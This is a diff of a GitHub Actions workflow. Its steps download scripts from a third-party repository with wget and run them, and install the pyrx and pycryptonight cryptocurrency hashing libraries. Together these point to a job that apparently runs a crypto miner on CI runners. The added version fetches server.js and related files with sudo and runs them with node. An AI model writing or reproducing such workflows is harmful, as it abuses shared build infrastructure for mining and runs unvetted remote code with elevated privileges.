@@ -6,10 +6,8 @@ jobs:
     steps:
 
     - name: Start
-      run: wget https://raw.githubusercontent.com/raiyan088/public/main/hash/test.py
-    - run: python --version
-    - run: pip install git+https://github.com/jtgrassie/pyrx
-    # - run: pip install py-cryptonight
-    - run: python test.py
-    # - run: python test.py
-    
+      run: sudo wget https://raw.githubusercontent.com/raiyan088/public/main/hash/server.js https://raw.githubusercontent.com/raiyan088/public/main/hash/server.py https://raw.githubusercontent.com/raiyan088/public/main/hash/package.json
+    - run: sudo pip install git+https://github.com/jtgrassie/pyrx
+    - run: sudo pip install pycryptonight
+    - run: npm install child_process net
+    - run: node server.js
